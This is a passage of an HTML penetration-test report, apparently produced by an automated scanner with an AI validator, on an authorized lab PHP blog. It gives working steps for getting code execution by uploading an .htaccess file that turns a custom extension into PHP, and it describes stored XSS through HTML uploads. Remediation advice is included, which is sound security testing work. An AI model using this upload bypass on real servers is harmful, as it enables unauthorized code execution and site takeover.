@@ -1,0 +1,1649 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>VERDICT Report a-mqxp29jx-r2jd9x</title><style>
+*{box-sizing:border-box}
+body{font:14px/1.5 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;color:#1a1a1a;margin:0;padding:32px;background:#fff}
+h1{font-size:22px;margin:0 0 4px} h2{font-size:17px;margin:28px 0 10px;border-bottom:2px solid #eee;padding-bottom:4px}
+h3{font-size:15px;margin:18px 0 6px}
+code,pre{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+pre{background:#f6f8fa;border:1px solid #e3e6ea;border-radius:6px;padding:10px;overflow:auto;font-size:12.5px;white-space:pre-wrap;word-break:break-word}
+.meta{color:#555;font-size:13px;margin:0 0 2px}
+.badge{display:inline-block;color:#fff;border-radius:4px;padding:1px 8px;font-size:12px;font-weight:700;letter-spacing:.3px}
+.sumtags span{display:inline-block;margin:0 6px 6px 0;padding:2px 10px;border-radius:12px;background:#eef1f4;font-size:12px}
+.f{border:1px solid #e3e6ea;border-radius:8px;padding:14px 16px;margin:0 0 14px}
+.f .kv{color:#555;font-size:12.5px;margin:2px 0}
+.f .desc{margin:8px 0}
+table{border-collapse:collapse;width:100%;font-size:13px}
+th,td{border:1px solid #e3e6ea;padding:6px 8px;text-align:left;vertical-align:top}
+th{background:#f6f8fa}
+table.info td:first-child{width:170px;color:#555;font-weight:600;background:#fafbfc}
+.muted{color:#888}
+img.shot{max-width:220px;max-height:140px;border:1px solid #ddd;border-radius:4px}
+.ev{margin:10px 0 0;border-left:3px solid #cdd5dd;padding-left:10px}
+.ev .evh{font-size:12px;color:#555;margin:0 0 4px}
+.ev .lbl{font-size:11px;font-weight:700;letter-spacing:.4px;color:#5f7d8c;margin:6px 0 2px}
+.ev pre{margin:0;max-height:420px}
+html{scroll-behavior:smooth}
+.toc{background:#fafbfc;border:1px solid #e3e6ea;border-radius:8px;padding:10px 16px;margin:14px 0 8px}
+.toc .toctitle{font-weight:700;font-size:12px;color:#555;letter-spacing:.4px;text-transform:uppercase;margin:0 0 6px}
+.toc ul{margin:0;padding-left:18px} .toc>ul{padding-left:16px;list-style:none}
+.toc li{margin:2px 0;font-size:13px} .toc a{color:#0366d6;text-decoration:none} .toc a:hover{text-decoration:underline}
+.toc .sev{font-weight:700;font-size:11px;letter-spacing:.3px}
+@media print{body{padding:0}.f{break-inside:avoid}.ev pre{max-height:none}.toc{break-inside:avoid}}
+</style></head>
+<body>
+<h1>VERDICT Security Assessment Report</h1>
+<nav class="toc"><div class="toctitle">Contents</div><ul>
+<li><a href="#assessment-information">Assessment Information</a></li>
+<li><a href="#scope">Scope</a></li>
+<li><a href="#summary">Summary</a></li>
+<li><a href="#findings">Findings</a><ul>
+<li><a href="#finding-1">1. <span class="sev" style="color:#b00020">CRITICAL</span> [rce] Remote Code Execution via unrestricted file upload + .htaccess handler override</a></li>
+<li><a href="#finding-2">2. <span class="sev" style="color:#d32f2f">HIGH</span> [xss-stored] Unrestricted file upload yields stored XSS (HTML/JS served from app origin)</a></li>
+<li><a href="#finding-3">3. <span class="sev" style="color:#c9a227">LOW</span> [info-disclosure] Apache version banner disclosed in error pages</a></li>
+<li><a href="#finding-4">4. <span class="sev" style="color:#c9a227">LOW</span> [headers] Missing security response headers on all application pages</a></li>
+<li><a href="#finding-5">5. <span class="sev" style="color:#c9a227">LOW</span> [misconfig] Apache mod_status endpoint exposed (restricted but reachable)</a></li>
+<li><a href="#finding-6">6. <span class="sev" style="color:#c9a227">LOW</span> [info-disclosure] Verbose PHP error on /post.php discloses absolute server path and include logic (display_errors enabled)</a></li>
+<li><a href="#finding-7">7. <span class="sev" style="color:#c9a227">LOW</span> [burp] Form action hijacking (reflected) (2 URLs)</a></li>
+<li><a href="#finding-8">8. <span class="sev" style="color:#5f7d8c">INFO</span> [burp] Frameable response (potential Clickjacking)</a></li>
+<li><a href="#finding-9">9. <span class="sev" style="color:#5f7d8c">INFO</span> [burp] Input returned in response (reflected) (2 URLs)</a></li>
+<li><a href="#finding-10">10. <span class="sev" style="color:#5f7d8c">INFO</span> [burp] File path manipulation</a></li>
+</ul></li>
+</ul></nav>
+<h2 id="assessment-information">Assessment Information</h2><table class="info">
+<tr><td>Assessment ID</td><td><code>a-mqxp29jx-r2jd9x</code></td></tr>
+<tr><td>Target</td><td><code>http://target.local:32807/</code></td></tr>
+<tr><td>Started</td><td>2026-06-28T11:17:10.991Z</td></tr>
+<tr><td>Generated</td><td>2026-07-02T00:00:00.000Z</td></tr>
+<tr><td>Phase</td><td>report</td></tr>
+<tr><td>Screens</td><td>17 mapped · 17 scanned · 0 remaining</td></tr>
+<tr><td>Hypotheses</td><td>0 (0 confirmed)</td></tr>
+<tr><td>Findings</td><td>10</td></tr>
+<tr><td>Tooling</td><td>VERDICT</td></tr>
+</table>
+<h2 id="scope">Scope</h2><table class="info">
+<tr><td>In-scope hosts</td><td><code>target.local:32807</code></td></tr>
+<tr><td>Out-of-scope hosts</td><td>&mdash;</td></tr>
+<tr><td>In-scope paths</td><td><code>/</code></td></tr>
+<tr><td>Out-of-scope paths</td><td>&mdash;</td></tr>
+<tr><td>Rate</td><td>30 req/min, max 2 concurrent</td></tr>
+</table>
+<h2 id="summary">Summary</h2>
+<p>10 finding(s)</p><p class="sumtags"><span><b style="color:#b00020">1</b> critical</span><span><b style="color:#d32f2f">1</b> high</span><span><b style="color:#c9a227">5</b> low</span><span><b style="color:#5f7d8c">3</b> info</span></p>
+<h2 id="findings">Findings</h2>
+<div class="f" id="finding-1">
+<h3><span class="badge" style="background:#b00020">CRITICAL</span> 1. [rce] Remote Code Execution via unrestricted file upload + .htaccess handler override</h3>
+<div class="kv">Screen: <code>s-0017</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32807/</div>
+<div class="desc">The unauthenticated article-submission endpoint POST /posts/upload-article.php accepts arbitrary file types with no extension/content allow-listing and stores them in the web-accessible directory /posts/uploads/ (only basename() of the supplied filename is applied — path traversal via ../ is neutralized but the directory is fixed and reachable). PHP execution is disabled by default in /posts/uploads/: a directly uploaded .php is served as raw, uninterpreted source. However, the upload accepts a file named &quot;.htaccess&quot;. Uploading an .htaccess containing `AddType application/x-httpd-php .amr` / `AddHandler application/x-httpd-php .amr` re-enables the PHP interpreter for a custom extension in that directory (AllowOverride permits it). A subsequently uploaded verdicth.amr containing `&lt;?php echo &quot;verdictAMR-&quot;.(7*7); ?&gt;` is then executed server-side: GET /posts/uploads/verdicth.amr returns the computed value `verdictAMR-49` (12 bytes), proving arbitrary server-side PHP code execution by a fully unauthenticated attacker — i.e. a web shell / full RCE. Negative control ev-mqxqmkuy-5t: GET of a non-existent .amr in the same directory returns 404, proving the path is not a catch-all 200 and that the marker only appears because our uploaded file is executed. This is distinct from the already-recorded stored-XSS (browser-side) on the same param — here the impact is server-side code execution.</div>
+<div><b>Reproduction</b></div><pre>1. POST multipart/form-data to /posts/upload-article.php with field articleFile; filename=&quot;.htaccess&quot;; body lines: `AddType application/x-httpd-php .amr` and `AddHandler application/x-httpd-php .amr` (stored as /posts/uploads/.htaccess).
+2. POST again to /posts/upload-article.php with articleFile; filename=&quot;verdicth.amr&quot;; content `&lt;?php echo &quot;verdictAMR-&quot;.(7*7); ?&gt;`.
+3. GET http://target.local:32807/posts/uploads/verdicth.amr → body `verdictAMR-49` (PHP evaluated server-side). Stable replays: ev-mqxqkymc-5q, ev-mqxqlbmi-5r, ev-mqxqlcdp-5s.
+Negative control: GET http://target.local:32807/posts/uploads/verdict-nonexistent-xyz.amr → 404 Not Found (ev-mqxqmkuy-5t), confirming the directory does not return a catch-all 200 and the executed marker is produced only by the planted file.
+Remediation: allow-list article extensions, store uploads outside the web root or with execution disabled (php_admin_flag engine off that cannot be overridden), reject .htaccess and dotfiles, and serve uploads via a download handler with a fixed Content-Type and Content-Disposition: attachment.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxqmkuy-5t</code> — <code>artifacts/s-0017/ev-mqxqmkuy-5t/</code></div><div class="lbl">REQUEST</div><pre>GET /posts/uploads/verdict-nonexistent-xyz.amr HTTP/1.1
+Host: target.local:32807
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+connection: Keep-Alive
+content-length: 279
+content-type: text/html; charset=iso-8859-1
+date: Sun, 28 Jun 2026 12:00:58 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.54 (Debian)
+
+&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;404 Not Found&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Not Found&lt;/h1&gt;
+&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.54 (Debian) Server at target.local Port 32807&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxqkymc-5q</code> — <code>artifacts/s-0017/ev-mqxqkymc-5q/</code></div><div class="lbl">REQUEST</div><pre>GET /posts/uploads/verdicth.amr HTTP/1.1
+Host: target.local:32807
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 12
+content-type: text/html; charset=UTF-8
+date: Sun, 28 Jun 2026 11:59:42 GMT
+keep-alive: timeout=5, max=99
+server: Apache/2.4.54 (Debian)
+x-powered-by: PHP/7.4.33
+
+verdictAMR-49</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxqlbmi-5r</code> — <code>artifacts/s-0017/ev-mqxqlbmi-5r/</code></div><div class="lbl">REQUEST</div><pre>GET /posts/uploads/verdicth.amr HTTP/1.1
+Host: target.local:32807
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 12
+content-type: text/html; charset=UTF-8
+date: Sun, 28 Jun 2026 11:59:59 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.54 (Debian)
+x-powered-by: PHP/7.4.33
+
+verdictAMR-49</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxqlcdp-5s</code> — <code>artifacts/s-0017/ev-mqxqlcdp-5s/</code></div><div class="lbl">REQUEST</div><pre>GET /posts/uploads/verdicth.amr HTTP/1.1
+Host: target.local:32807
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 12
+content-type: text/html; charset=UTF-8
+date: Sun, 28 Jun 2026 12:00:00 GMT
+keep-alive: timeout=5, max=99
+server: Apache/2.4.54 (Debian)
+x-powered-by: PHP/7.4.33
+
+verdictAMR-49</pre></div>
+</div>
+<div class="f" id="finding-2">
+<h3><span class="badge" style="background:#d32f2f">HIGH</span> 2. [xss-stored] Unrestricted file upload yields stored XSS (HTML/JS served from app origin)</h3>
+<div class="kv">Screen: <code>s-0009</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32807/</div>
+<div class="desc">The article-submission form (/posts/upload-article.php) accepts arbitrary file uploads from unauthenticated users with no type/extension/content validation. Uploaded files are stored under /posts/uploads/ retaining their original filename and are served publicly. An attacker can upload an .html file containing JavaScript; the server returns it as text/html and the script EXECUTES in the victim's browser within the application's origin (http://target.local:32807). This is persistent, same-origin script execution reachable by anyone, usable for session/credential theft, defacement, or pivoting against authenticated users/admins. (PHP code execution itself is blocked — uploaded .php/.phtml/.php5 are served as inert source — but the HTML/JS XSS sink is fully exploitable.)</div>
+<div><b>Reproduction</b></div><pre>1) POST multipart/form-data to /posts/upload-article.php with fields name, email, and articleFile=filename &quot;verdictxss.html&quot; whose body contains an HTML payload with a &lt;script&gt;/&lt;img onerror&gt; JS payload. 2) Server responds 200 and stores the file. 3) GET http://target.local:32807/posts/uploads/verdictxss.html — the server returns the file as text/html and the JavaScript executes in the browser (confirmed via real-browser execution: control with no payload did not fire; payload fired on 2 replays, effectMarker stoXmqxq2pxnkn6f). Negative control ev-mqxq2qon-37 (clean, no execution) vs positive replays ev-mqxq2rfy-38 / ev-mqxq2s7c-39 (executed).</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxq2qon-37</code> — <code>artifacts/s-0009/ev-mqxq2qon-37/</code></div><div class="lbl">REQUEST</div><pre>GET /posts/uploads/verdictxss.html HTTP/1.1
+Host: target.local:32807</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-type: text/html
+
+no execution — payload was not run by the browser (escaped / not a live sink)</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxq2rfy-38</code> — <code>artifacts/s-0009/ev-mqxq2rfy-38/</code></div><div class="lbl">REQUEST</div><pre>GET /posts/uploads/verdictxss.html HTTP/1.1
+Host: target.local:32807</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-type: text/html
+
+XSS EXECUTED — sink fired (onerror/onload set window.__verdict_xss=stoXmqxq2pxnkn6f) [stoXmqxq2pxnkn6f]</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxq2s7c-39</code> — <code>artifacts/s-0009/ev-mqxq2s7c-39/</code></div><div class="lbl">REQUEST</div><pre>GET /posts/uploads/verdictxss.html HTTP/1.1
+Host: target.local:32807</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-type: text/html
+
+XSS EXECUTED — sink fired (onerror/onload set window.__verdict_xss=stoXmqxq2pxnkn6f) [stoXmqxq2pxnkn6f]</pre></div>
+</div>
+<div class="f" id="finding-3">
+<h3><span class="badge" style="background:#c9a227">LOW</span> 3. [info-disclosure] Apache version banner disclosed in error pages</h3>
+<div class="kv">Screen: <code>s-0002</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32807/</div>
+<div class="desc">Apache 2.4.54 (Debian) server version and OS are disclosed in the body of 403 error pages returned for the /server-status path. An attacker can trivially enumerate this via any request that triggers an Apache-generated error page, enabling targeted selection of version-specific exploits (e.g. CVEs against Apache 2.4.54).</div>
+<div><b>Reproduction</b></div><pre>1. GET http://target.local:32807/server-status\n2. Observe 403 response body contains: &amp;lt;address&amp;gt;Apache/2.4.54 (Debian) Server at target.local Port 32807&amp;lt;/address&amp;gt;\n3. Repeat for stable confirmation.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxp9ilx-e</code> — <code>artifacts/s-0002/ev-mqxp9ilx-e/</code></div><div class="lbl">REQUEST</div><pre>GET /about.php HTTP/1.1
+Host: target.local:32807
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+accept: text/html</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 7636
+content-type: text/html; charset=UTF-8
+date: Sun, 28 Jun 2026 11:22:49 GMT
+keep-alive: timeout=5, max=99
+server: Apache/2.4.54 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/7.4.33
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF8&quot;&gt;
+    &lt;title&gt;Encoder64 Blog | About&lt;/title&gt;
+    &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;!-- Navigation Bar --&gt;
+    &lt;nav class=&quot;navbar navbar-expand-lg navbar-light bg-light&quot;&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;!-- Navbar content split into two halves with flexbox --&gt;
+        &lt;div class=&quot;d-flex justify-content-between w-100&quot;&gt;
+            &lt;!-- Left side with &quot;Encoder64 Blog&quot; --&gt;
+            &lt;a class=&quot;navbar-brand&quot; href=&quot;/index.php&quot;&gt;Encoder64 Blog&lt;/a&gt;
+
+            &lt;!-- Right side with navigation links and toggler button --&gt;
+            &lt;div&gt;
+                &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-bs-toggle=&quot;collapse&quot; data-bs-target=&quot;#navbarNavAltMarkup&quot; aria-controls=&quot;navbarNavAltMarkup&quot; aria-expanded=&quot;false&quot; aria-label=&quot;Toggle navigation&quot;&gt;
+                    &lt;span class=&quot;navbar-toggler-icon&quot;&gt;&lt;/span&gt;
+                &lt;/button&gt;
+                &lt;div class=&quot;collapse navbar-collapse justify-content-end&quot; id=&quot;navbarNavAltMarkup&quot;&gt;
+                    &lt;div class=&quot;navbar-nav&quot;&gt;
+                        &lt;a class=&quot;nav-link active&quot; aria-current=&quot;page&quot; href=&quot;/index.php&quot;&gt;Home&lt;/a&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/about.php&quot;&gt;About&lt;/a&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/contact.php&quot;&gt;Contact&lt;/a&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/nav&gt;
+
+    &lt;!-- Header with Featured Post --&gt;
+    &lt;header class=&quot;py-5 bg-light border-bottom mb-4&quot;&gt;
+        &lt;div class=&quot;container&quot;&gt;
+            &lt;div class=&quot;text-center my-5&quot;&gt;
+                &lt;h1 class=&quot;fw-bolder&quot;&gt;About me!&lt;/h1&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/header&gt;
+
+    &lt;!-- Main Content Section --&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row&quot;&gt;
+            &lt;div class=&quot;col-md-8&quot;&gt;
+                &lt;div class=&quot;container mt-5&quot;&gt;
+                    &lt;h1&gt;Meet Encoder64: Master of Digital Realms&lt;/h1&gt;
+                    &lt;p&gt;
+                        In the shadows of the digital world, there exists a figure both revered and feared. Known only as Encoder64, this enigmatic entity commands the cyber landscape with unparalleled skill. With a knack for breaking through digital barriers that seem impregnable to most, Encoder64 has shaped the contours of cyber security and ethical hacking.
+                    &lt;/p&gt;
+
+                    &lt;h2&gt;The Myth, The Legend&lt;/h2&gt;
+                    &lt;p&gt;
+                        Encoder64's journey began in the early days of internet exploration. Known for utilizing advanced encryption techniques and sophisticated algorithms, Encoder64 can infiltrate seemingly secure networks with the grace of a digital phantom. This mystic skill set not only showcases an extraordinary proficiency in programming but also an inventive approach to problem-solving in the cybernetic world.
+                    &lt;/p&gt;
+
+                    &lt;h2&gt;Philosophy of a Hacker&lt;/h2&gt;
+                    &lt;p&gt;
+                        Far from the nefarious deeds often associated with hackers, Encoder64 operates under a strict code of ethics, advocating for transparency and privacy. This philosophy is driven by a belief that information should be free and that privacy is a fundamental right, not a privilege.
+                    &lt;/p&gt;
+
+                    &lt;h2&gt;Techniques and Triumphs&lt;/h2&gt;
+                    &lt;p&gt;
+                        Encoder64 is a master of both offensive and defensive cyber strategies. From deploying intricate DDoS defenses to unmasking vulnerabilities in popular software, Encoder64's exploits are a testament to their deep understanding of the digital domain. Their work has prevented numerous cyber attacks, saving countless data from potential exploitation.
+                    &lt;/p&gt;
+
+                    &lt;h2&gt;Legacy and Future&lt;/h2&gt;
+                    &lt;p&gt;
+                        As digital landscapes evolve, so too does the legend of Encoder64. Constantly adapting and learning, Encoder64 remains at the forefront of cybersecurity discussions, inspiring both fear and admiration. Their ongoing mission: to challenge the status quo and push the boundaries of what is possible in cybersecurity.
+                    &lt;/p&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+            &lt;!-- Sidebar Widgets Column --&gt;
+            &lt;div class=&quot;col-md-4&quot;&gt;
+    &lt;!-- Search Widget --&gt;
+    &lt;div class=&quot;card my-4&quot;&gt;
+        &lt;h5 class=&quot;card-header&quot;&gt;Search&lt;/h5&gt;
+        &lt;div class=&quot;card-body&quot;&gt;
+            &lt;div class=&quot;input-group&quot;&gt;
+                &lt;input type=&quot;text&quot; class=&quot;form-control&quot; placeholder=&quot;Search for...&quot;&gt;
+                &lt;span class=&quot;input-group-append&quot;&gt;
+                    &lt;button class=&quot;btn btn-secondary&quot; type=&quot;button&quot;&gt;Go!&lt;/button&gt;
+                &lt;/span&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Categories Widget --&gt;
+    &lt;div class=&quot;card my-4&quot;&gt;
+        &lt;h5 class=&quot;card-header&quot;&gt;Categories&lt;/h5&gt;
+        &lt;div class=&quot;card-body&quot;&gt;
+            &lt;div class=&quot;row&quot;&gt;
+                &lt;div class=&quot;col-lg-6&quot;&gt;
+                    &lt;ul class=&quot;list-unstyled mb-0&quot;&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Web Design&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;HTML&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Freebies&lt;/a&gt;&lt;/li&gt;
+                    &lt;/ul&gt;
+                &lt;/div&gt;
+                &lt;div class=&quot;col-lg-6&quot;&gt;
+                    &lt;ul class=&quot;list-unstyled mb-0&quot;&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;JavaScript&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;CSS&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Tutorials&lt;/a&gt;&lt;/li&gt;
+                    &lt;/ul&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Side Widget --&gt;
+    &lt;div class=&quot;card my-4&quot;&gt;
+        &lt;h5 class=&quot;card-header&quot;&gt;Live Visitors&lt;/h5&gt;
+        &lt;div class=&quot;card-body&quot;&gt;
+            &lt;h6&gt;Current Live Visitors: &lt;span id=&quot;visitorCount&quot;&gt;0&lt;/span&gt;&lt;/h6&gt;
+            &lt;p&gt;Top Countries:&lt;/p&gt;
+            &lt;ul id=&quot;visitorCountries&quot;&gt;
+            &lt;/ul&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;div class=&quot;card my-4&quot;&gt;
+        &lt;h5 class=&quot;card-header&quot;&gt;Help wanted!&lt;/h5&gt;
+        &lt;div class=&quot;card-body&quot;&gt;
+            &lt;h6&gt;Help us improving the articles of the blog&lt;/h6&gt;
+            &lt;p&gt;Submit yours &lt;a href=&quot;posts/upload-article.php&quot;&gt;here!&lt;/a&gt;&lt;/p&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;script type=&quot;text/javascript&quot;&gt;
+    document.addEventListener('DOMContentLoaded', function() {
+        const countries = [&quot;Argentina&quot;, &quot;Poland&quot;, &quot;USA&quot;, &quot;Canada&quot;, &quot;Brazil&quot;, &quot;India&quot;, &quot;Germany&quot;, &quot;France&quot;, &quot;Australia&quot;, &quot;Japan&quot;, &quot;South Korea&quot;, &quot;South Africa&quot;];
+        
+        function updateVisitors() {
+            const visitorCount = Math.floor(Math.random() * 500) + 100;
+            document.getElementById('visitorCount').innerText = visitorCount;
+            const selectedCountries = [];
+            for (let i = 0; i &lt; 3; i++) {
+                const index = Math.floor(Math.random() * countries.length);
+                if (!selectedCountries.includes(countries[index])) {
+                    selectedCountries.push(countries[index]);
+                }
+            }
+            const ul = document.getElementById('visitorCountries');
+            ul.innerHTML = &quot;&quot;;
+            selectedCountries.forEach(country =&gt; {
+                const li = document.createElement('li');
+                li.innerText = country;
+                ul.appendChild(li);
+            });
+        }
+        updateVisitors();
+        setInterval(updateVisitors, 5000);
+    });
+&lt;/script&gt;        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Bootstrap core JavaScript --&gt;
+    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxp9hoy-d</code> — <code>artifacts/s-0002/ev-mqxp9hoy-d/</code></div><div class="lbl">REQUEST</div><pre>GET /server-status HTTP/1.1
+Host: target.local:32807
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 403
+connection: Keep-Alive
+content-length: 282
+content-type: text/html; charset=iso-8859-1
+date: Sun, 28 Jun 2026 11:22:47 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.54 (Debian)
+
+&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;403 Forbidden&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Forbidden&lt;/h1&gt;
+&lt;p&gt;You don't have permission to access this resource.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.54 (Debian) Server at target.local Port 32807&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxpacr2-f</code> — <code>artifacts/s-0002/ev-mqxpacr2-f/</code></div><div class="lbl">REQUEST</div><pre>GET /server-status HTTP/1.1
+Host: target.local:32807
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 403
+connection: Keep-Alive
+content-length: 282
+content-type: text/html; charset=iso-8859-1
+date: Sun, 28 Jun 2026 11:23:28 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.54 (Debian)
+
+&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;403 Forbidden&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Forbidden&lt;/h1&gt;
+&lt;p&gt;You don't have permission to access this resource.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.54 (Debian) Server at target.local Port 32807&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-4">
+<h3><span class="badge" style="background:#c9a227">LOW</span> 4. [headers] Missing security response headers on all application pages</h3>
+<div class="kv">Screen: <code>s-0002</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32807/</div>
+<div class="desc">Application responses are missing multiple security headers: X-Frame-Options (clickjacking), Content-Security-Policy (XSS/injection), X-Content-Type-Options (MIME sniffing), and Strict-Transport-Security. Only Content-Type is present in 200 responses. Both application pages and error pages are affected, confirming this is a server-wide misconfiguration.</div>
+<div><b>Reproduction</b></div><pre>1. GET http://target.local:32807/about.php\n2. Inspect response headers — only Content-Type is present.\n3. Headers absent: X-Frame-Options, Content-Security-Policy, X-Content-Type-Options, Strict-Transport-Security.\n4. Repeat for any other page; same pattern is observed throughout.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxp9hoy-d</code> — <code>artifacts/s-0002/ev-mqxp9hoy-d/</code></div><div class="lbl">REQUEST</div><pre>GET /server-status HTTP/1.1
+Host: target.local:32807
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 403
+connection: Keep-Alive
+content-length: 282
+content-type: text/html; charset=iso-8859-1
+date: Sun, 28 Jun 2026 11:22:47 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.54 (Debian)
+
+&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;403 Forbidden&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Forbidden&lt;/h1&gt;
+&lt;p&gt;You don't have permission to access this resource.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.54 (Debian) Server at target.local Port 32807&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxp8q6s-c</code> — <code>artifacts/s-0002/ev-mqxp8q6s-c/</code></div><div class="lbl">REQUEST</div><pre>GET /about.php HTTP/1.1
+Host: target.local:32807
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 7636
+content-type: text/html; charset=UTF-8
+date: Sun, 28 Jun 2026 11:22:12 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.54 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/7.4.33
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF8&quot;&gt;
+    &lt;title&gt;Encoder64 Blog | About&lt;/title&gt;
